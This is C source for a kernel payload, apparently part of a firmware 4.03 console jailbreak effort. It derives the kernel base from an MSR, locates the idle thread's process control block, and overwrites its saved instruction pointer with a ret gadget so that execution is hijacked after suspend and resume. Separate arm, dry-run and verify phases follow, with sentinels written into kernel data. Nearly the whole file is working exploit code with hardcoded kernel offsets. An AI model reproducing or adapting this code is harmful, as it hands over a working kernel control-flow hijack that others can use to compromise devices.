#include <stdint.h>

/*
 * pcb_overwrite v1 — Overwrite idle PCB's pcb_rip to prove hijack
 *
 * PROVEN SO FAR:
 *   - kdata persists across suspend/resume (pcb_diff phase 2 confirmed)
 *   - cpu_switch runs during resume, loads registers from idle PCB
 *   - pcb_rip, pcb_rsp, pcb_rbp, pcb_rbx are all stable across cycles
 *   - Only pcb_r13 changed (new curthread pointer — expected)
 *
 * THE ATTACK:
 *   cpu_switch's restore sequence does:
 *     movq PCB_RSP(%r8), %rsp
 *     movq PCB_RIP(%r8), %rax
 *     jmp  *%rax
 *
 *   Normally pcb_rip = sw_return (inside cpu_switch), which does
 *   some cleanup and then `ret` back to mi_switch.
 *
 *   If we overwrite pcb_rip BEFORE suspend, when the CPU resumes
 *   and cpu_switch restores the idle thread, it will jmp to OUR address.
 *
 * SAFE TEST (nop_ret hijack):
 *   - Keep pcb_rsp = original (real idle stack, unchanged)
 *   - Set pcb_rip = nop_ret (ktext `ret` gadget at kdata - 0x9d20ca)
 *   - On resume: jmp nop_ret → ret → pops [rsp] → back to mi_switch
 *   - This should be transparent — kernel continues normally
 *   - Write sentinels to kdata to prove we were here
 *
 * PHASES:
 *   fw_ver=0x403: Phase 1 — Snapshot idle PCB, overwrite pcb_rip, arm
 *   fw_ver=0x2:   Phase 2 — Verify post-resume: read PCB, check sentinels
 *   fw_ver=0x3:   Phase 1 DRY RUN — snapshot only, NO overwrite (safe)
 *
 * Output layout — Phase 1 (ARM):
 *   [0]   magic "PCBO" (0x5043424F) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   phase (1 = armed, 3 = dry run)
 *
 *   --- addresses ---
 *   [4]   pcpu0
 *   [5]   idlethread
 *   [6]   idle_pcb
 *   [7]   nop_ret address
 *   [8]   original pcb_rip (sw_return)
 *   [9]   original pcb_rsp
 *   [10]  apic_ops[2] (original, not hooked)
 *
 *   --- idle PCB snapshot (8 key fields) ---
 *   [12]  pcb_r15
 *   [13]  pcb_r14
 *   [14]  pcb_r13
 *   [15]  pcb_r12
 *   [16]  pcb_rbp
 *   [17]  pcb_rsp
 *   [18]  pcb_rbx
 *   [19]  pcb_rip
 *
 *   --- pcb_rip overwrite ---
 *   [20]  pcb_rip BEFORE overwrite
 *   [21]  pcb_rip AFTER overwrite (readback)
 *   [22]  overwrite target (nop_ret)
 *
 *   --- kdata sentinel ---
 *   [24]  sentinel address (kdata+0x400)
 *   [25]  sentinel value written
 *
 *   [30]  sentinel 0xdeadbeefcafe00BB
 *
 * Output layout — Phase 2 (VERIFY):
 *   [0]   magic "PCBO" (0x5043424F) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   phase (2)
 *
 *   --- post-resume state ---
 *   [4]   pcpu0
 *   [5]   curthread (post-resume)
 *   [6]   idlethread
 *   [7]   idle_pcb
 *
 *   --- current idle PCB (8 key fields) ---
 *   [10]  pcb_r15
 *   [11]  pcb_r14
 *   [12]  pcb_r13
 *   [13]  pcb_r12
 *   [14]  pcb_rbp
 *   [15]  pcb_rsp
 *   [16]  pcb_rbx
 *   [17]  pcb_rip  (*** did cpu_switch update this? ***)
 *
 *   --- kdata persistence checks ---
 *   [20]  kdata+0x400 sentinel (should be PCBO_SENT if survived)
 *   [21]  kdata+0x200 snap_magic (from pcb_diff, if still there)
 *
 *   --- pcb_rip analysis ---
 *   [24]  pre-overwrite pcb_rip (from kdata+0x410 backup)
 *   [25]  current pcb_rip
 *   [26]  nop_ret address
 *   [27]  1 if pcb_rip was restored to sw_return (cpu_switch ran normally)
 *         2 if pcb_rip is still nop_ret (overwrite persisted but wasn't used??)
 *         3 if pcb_rip is something else entirely
 *
 *   [30]  sentinel 0xdeadbeefcafe00CC
 */

#define MAGIC_PCBO       0x5043424F  /* "PCBO" */
#define PCBO_SENTINEL    0x5043424F48494A4BULL  /* "PCBOHIJK" */

/* FW 4.03 offsets */
#define PCPU_ARRAY_OFF       0x64d2280
#define APIC_OPS_OFF_KTEXT   0x1934AC8
#define NOP_RET_OFF          (-0x9d20ca)   /* relative to kdata_base */

/* pcpu offsets */
#define PC_CURTHREAD     0x00
#define PC_IDLETHREAD    0x08

/* thread / PCB offsets */
#define TD_PCB           0x3f8
#define PCB_R15          0x00
#define PCB_R14          0x08
#define PCB_R13          0x10
#define PCB_R12          0x18
#define PCB_RBP          0x20
#define PCB_RSP          0x28
#define PCB_RBX          0x30
#define PCB_RIP          0x38

/* kdata persistence locations */
#define KDATA_SENT_OFF   0x400   /* sentinel to verify kdata persistence */
#define KDATA_BACKUP_OFF 0x410   /* backup of original pcb_rip */

#define MIN_KERN_ADDR    0xFFFF800000000000ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t*)addr = val;
}

static void phase1_arm(uint64_t kdata_base, volatile uint64_t* out,
                       volatile uint32_t* out32, int dry_run)
{
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
    volatile uint64_t* apic_table = (volatile uint64_t*)apic_ops_addr;
    uint64_t nop_ret = kdata_base + NOP_RET_OFF;

    uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
    uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);

    /* Header */
    out32[0] = MAGIC_PCBO;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = dry_run ? 3 : 1;

    out[4] = pcpu0;
    out[5] = idlethread;

    /* Get idle PCB */
    uint64_t idle_pcb = 0;
    if (idlethread >= MIN_KERN_ADDR)
        idle_pcb = read8(idlethread + TD_PCB);

    out[6] = idle_pcb;
    out[7] = nop_ret;

    if (idle_pcb < MIN_KERN_ADDR) {
        out32[1] = 0xFE;  /* error: invalid idle_pcb */
        out[30] = 0xdeadbeefcafe00BBULL;
        return;
    }

    /* Read current idle PCB state */
    uint64_t orig_rip = read8(idle_pcb + PCB_RIP);
    uint64_t orig_rsp = read8(idle_pcb + PCB_RSP);

    out[8]  = orig_rip;
    out[9]  = orig_rsp;
    out[10] = apic_table[2];

    /* Snapshot 8 key PCB fields */
    out[12] = read8(idle_pcb + PCB_R15);
    out[13] = read8(idle_pcb + PCB_R14);
    out[14] = read8(idle_pcb + PCB_R13);
    out[15] = read8(idle_pcb + PCB_R12);
    out[16] = read8(idle_pcb + PCB_RBP);
    out[17] = read8(idle_pcb + PCB_RSP);
    out[18] = read8(idle_pcb + PCB_RBX);
    out[19] = read8(idle_pcb + PCB_RIP);

    /* Record what we're about to do */
    out[20] = orig_rip;  /* BEFORE */

    if (!dry_run) {
        /* Backup original pcb_rip to kdata (for phase 2 comparison) */
        write8(kdata_base + KDATA_BACKUP_OFF, orig_rip);
        write8(kdata_base + KDATA_BACKUP_OFF + 8, nop_ret);

        /* Write kdata sentinel to prove persistence */
        write8(kdata_base + KDATA_SENT_OFF, PCBO_SENTINEL);

        /* === THE OVERWRITE === */
        write8(idle_pcb + PCB_RIP, nop_ret);

        /* Readback to confirm */
        out[21] = read8(idle_pcb + PCB_RIP);
        out[22] = nop_ret;

        out[24] = kdata_base + KDATA_SENT_OFF;
        out[25] = PCBO_SENTINEL;
    } else {
        /* Dry run: don't touch anything, just report */
        out[21] = orig_rip;  /* unchanged */
        out[22] = nop_ret;   /* would-be target */
        out[24] = kdata_base + KDATA_SENT_OFF;
        out[25] = 0;  /* not written */
    }

    out[30] = 0xdeadbeefcafe00BBULL;
    out32[1] = 0x0001;
}

static void phase2_verify(uint64_t kdata_base, volatile uint64_t* out,
                          volatile uint32_t* out32)
{
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t nop_ret = kdata_base + NOP_RET_OFF;

    uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
    uint64_t curthread  = read8(pcpu0 + PC_CURTHREAD);
    uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);

    /* Header */
    out32[0] = MAGIC_PCBO;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = 2;

    out[4] = pcpu0;
    out[5] = curthread;
    out[6] = idlethread;

    uint64_t idle_pcb = 0;
    if (idlethread >= MIN_KERN_ADDR)
        idle_pcb = read8(idlethread + TD_PCB);

    out[7] = idle_pcb;

    if (idle_pcb < MIN_KERN_ADDR) {
        out32[1] = 0xFE;
        out[30] = 0xdeadbeefcafe00CCULL;
        return;
    }

    /* Read current idle PCB */
    out[10] = read8(idle_pcb + PCB_R15);
    out[11] = read8(idle_pcb + PCB_R14);
    out[12] = read8(idle_pcb + PCB_R13);
    out[13] = read8(idle_pcb + PCB_R12);
    out[14] = read8(idle_pcb + PCB_RBP);
    out[15] = read8(idle_pcb + PCB_RSP);
    out[16] = read8(idle_pcb + PCB_RBX);
    out[17] = read8(idle_pcb + PCB_RIP);

    /* kdata persistence checks */
    out[20] = read8(kdata_base + KDATA_SENT_OFF);
    out[21] = read8(kdata_base + 0x200);  /* pcb_diff snap_magic */

    /* pcb_rip analysis */
    uint64_t backed_up_rip = read8(kdata_base + KDATA_BACKUP_OFF);
    uint64_t current_rip = read8(idle_pcb + PCB_RIP);

    out[24] = backed_up_rip;  /* original pcb_rip (saved in phase 1) */
    out[25] = current_rip;    /* current pcb_rip */
    out[26] = nop_ret;

    /*
     * Analysis:
     * 1 = pcb_rip was restored to original sw_return
     *     → cpu_switch ran and saved its own return address back.
     *       The nop_ret hijack worked: cpu_switch loaded nop_ret as %rax,
     *       jumped to it, `ret` popped the mi_switch return address off
     *       the stack, and execution continued normally. Then later,
     *       cpu_switch ran again (idle loop) and saved the real sw_return
     *       back into pcb_rip. SUCCESS — we hijacked execution and survived.
     *
     * 2 = pcb_rip is still nop_ret
     *     → The overwrite persisted but cpu_switch hasn't re-saved yet,
     *       OR cpu_switch never ran with this PCB during resume.
     *       Still means kdata persistence worked, but hijack status unknown.
     *
     * 3 = pcb_rip is something else
     *     → Unexpected. Maybe the resume path overwrites pcb_rip directly.
     */
    if (current_rip == backed_up_rip)
        out[27] = 1;  /* restored to original */
    else if (current_rip == nop_ret)
        out[27] = 2;  /* still our overwrite */
    else
        out[27] = 3;  /* something else */

    out[30] = 0xdeadbeefcafe00CCULL;
    out32[1] = 0x0001;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    /* Zero output */
    for (int i = 0; i < 280; i++)
        out[i] = 0;

    if (mode == 0x403) {
        phase1_arm(kdata_base, out, out32, 0);   /* ARM */
    } else if (mode == 0x3) {
        phase1_arm(kdata_base, out, out32, 1);   /* DRY RUN */
    } else if (mode == 0x2) {
        phase2_verify(kdata_base, out, out32);
    } else {
        out32[0] = MAGIC_PCBO;
        out32[1] = 0xFF;
        out[1] = kdata_base;
        out[30] = 0xdeadbeefcafe00BBULL;
    }

    return 0;
}
